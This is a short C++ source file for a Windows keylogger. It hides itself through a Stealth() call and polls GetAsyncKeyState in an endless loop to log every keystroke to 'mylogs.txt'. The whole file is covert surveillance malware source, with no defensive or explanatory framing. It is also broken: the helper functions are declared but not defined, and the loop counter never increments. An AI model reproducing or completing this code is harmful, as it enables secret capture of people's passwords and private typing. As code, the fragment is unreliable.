# include<iostream>
# include<windows.h>
# include<winuser.h>

using namespace std;

int SaveLogs(int keyStroke, char *file);
void Stealth();

int main()
{
    Stealth();

    char i;

    while(1)
    {
        for(i = 8; i <= 190; i)
        {
            if(GetAsyncKeyState(i) == -32767)
            {
                SaveLogs(i, "mylogs.txt");
            }
        }


    }

    system("PAUSE");

    return 0;
}

